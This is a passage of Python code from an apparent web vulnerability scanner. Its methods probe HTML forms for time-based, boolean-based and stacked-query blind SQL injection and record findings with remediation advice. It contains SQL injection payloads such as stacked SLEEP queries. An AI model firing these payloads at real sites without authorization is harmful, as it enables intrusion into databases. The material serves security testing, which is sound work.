            if isinstance(e, requests.Timeout) and time_based:
                vulnerabilities.append({
                    'type': 'Time-based Blind SQL Injection (Form)',
                    'url': action,
                    'parameter': input_field['name'],
                    'payload': payload,
                    'evidence': 'Request timed out',
                    'severity': 'High',
                    'description': 'Time-based blind SQL injection vulnerability detected in a form. The application appears to be vulnerable to time-based blind SQL injection attacks.',
                    'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling and set query timeouts.',
                    'confidence': 'High'
                })
                return False  # Vulnerability found
            else:
                print(f"Error testing form at {action} with payload {payload}: {str(e)}")
        
        return True  # Continue testing
    
    def _test_form_boolean_based(self, form, action, input_field, baseline_response, vulnerabilities, 
                               test_pairs, timeout=15, headers=None):
        """Test a form field for boolean-based blind SQL injection with enhanced detection"""
        headers = headers or {}
        
        for true_payload, false_payload in test_pairs:
            # Prepare data for TRUE condition
            true_data = {}
            for field in form['inputs']:
                if field['name'] == input_field['name']:
                    true_data[field['name']] = true_payload
                else:
                    true_data[field['name']] = field['value'] or 'test'
            
            # Prepare data for FALSE condition
            false_data = {}
            for field in form['inputs']:
                if field['name'] == input_field['name']:
                    false_data[field['name']] = false_payload
                else:
                    false_data[field['name']] = field['value'] or 'test'
            
            try:
                # Add a small delay between requests
                time.sleep(0.5)
                
                # Send requests
                if form['method'] == 'post':
                    true_response = requests.post(action, data=true_data, timeout=timeout, headers=headers)
                    time.sleep(0.5)  # Add delay between requests
                    false_response = requests.post(action, data=false_data, timeout=timeout, headers=headers)
                else:
                    true_response = requests.get(action, params=true_data, timeout=timeout, headers=headers)
                    time.sleep(0.5)  # Add delay between requests
                    false_response = requests.get(action, params=false_data, timeout=timeout, headers=headers)
                
                # Compare responses
                if true_response.status_code == 200 and false_response.status_code == 200:
                    # Check if responses are significantly different
                    similarity = self._compare_responses(true_response.text, false_response.text)
                    
                    # Also compare with baseline
                    baseline_true_similarity = self._compare_responses(baseline_response.text, true_response.text)
                    baseline_false_similarity = self._compare_responses(baseline_response.text, false_response.text)
                    
                    # If true condition is similar to baseline but false is different, or vice versa
                    if (similarity < 0.9 and  # Responses are different from each other
                        ((baseline_true_similarity > 0.9 and baseline_false_similarity < 0.9) or  # TRUE similar to baseline, FALSE different
                         (baseline_true_similarity < 0.9 and baseline_false_similarity > 0.9))):  # FALSE similar to baseline, TRUE different
                        
                        # Calculate confidence based on similarity difference
                        confidence = 'High' if similarity < 0.7 else 'Medium'
                        
                        vulnerabilities.append({
                            'type': 'Boolean-based Blind SQL Injection (Form)',
                            'url': action,
                            'parameter': input_field['name'],
                            'payload': f'TRUE: {true_payload}, FALSE: {false_payload}',
                            'evidence': f'Response difference: {(1-similarity)*100:.2f}%',
                            'severity': 'High',
                            'description': 'Boolean-based blind SQL injection vulnerability detected in a form. The application returns different responses for TRUE and FALSE conditions.',
                            'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                            'confidence': confidence
                        })
                        return  # Vulnerability found
                
                # Also check for different status codes
                elif true_response.status_code != false_response.status_code:
                    vulnerabilities.append({
                        'type': 'Boolean-based Blind SQL Injection (Form)',
                        'url': action,
                        'parameter': input_field['name'],
                        'payload': f'TRUE: {true_payload}, FALSE: {false_payload}',
                        'evidence': f'Different status codes: TRUE={true_response.status_code}, FALSE={false_response.status_code}',
                        'severity': 'High',
                        'description': 'Boolean-based blind SQL injection vulnerability detected in a form. The application returns different status codes for TRUE and FALSE conditions.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling.',
                        'confidence': 'High'
                    })
                    return  # Vulnerability found
            
            except Exception as e:
                print(f"Error testing boolean-based injection on form at {action}: {str(e)}")
    
    def _test_form_stacked_queries(self, form, action, input_field, baseline_response, vulnerabilities, 
                                 timeout=15, headers=None):
        """Test a form field for stacked queries SQL injection"""
        headers = headers or {}
        
        # Stacked query payloads
        stacked_payloads = [
            "1; SELECT SLEEP(5) --",
            "1'; SELECT SLEEP(5) --",
            "1\"; SELECT SLEEP(5) --"
        ]
        
        for payload in stacked_payloads:
            # Prepare the form data
            data = {}
            for field in form['inputs']:
                if field['name'] == input_field['name']:
                    data[field['name']] = payload
                else:
                    data[field['name']] = field['value'] or 'test'
            
            try:
                # Send the request and measure time
                start_time = time.time()
                if form['method'] == 'post':
                    response = requests.post(action, data=data, timeout=timeout*2, headers=headers)  # Double timeout for sleep
                else:
                    response = requests.get(action, params=data, timeout=timeout*2, headers=headers)  # Double timeout for sleep
                end_time = time.time()
                
                # If response time is significantly longer, it might be vulnerable to stacked queries
                if end_time - start_time > 4.5:  # Slightly less than the sleep time to account for network variance
                    vulnerabilities.append({
                        'type': 'Stacked Queries SQL Injection (Form)',
                        'url': action,
                        'parameter': input_field['name'],
                        'payload': payload,
                        'evidence': f'Response time: {end_time - start_time:.2f} seconds',
                        'severity': 'High',
                        'description': 'Stacked queries SQL injection vulnerability detected in a form. The application appears to be executing multiple SQL statements in a single query.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Disable stacked queries if possible.',
                        'confidence': 'High'
                    })
                    return  # Vulnerability found
            
            except Exception as e:
                # Timeout might indicate a successful stacked query
                if isinstance(e, requests.Timeout):
                    vulnerabilities.append({
                        'type': 'Stacked Queries SQL Injection (Form)',
                        'url': action,
                        'parameter': input_field['name'],
                        'payload': payload,
                        'evidence': 'Request timed out',
                        'severity': 'High',
                        'description': 'Stacked queries SQL injection vulnerability detected in a form. The application appears to be executing multiple SQL statements in a single query.',
                        'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Disable stacked queries if possible.',
                        'confidence': 'Medium'
                    })
                    return  # Vulnerability found
                else:
                    print(f"Error testing stacked queries on form at {action}: {str(e)}")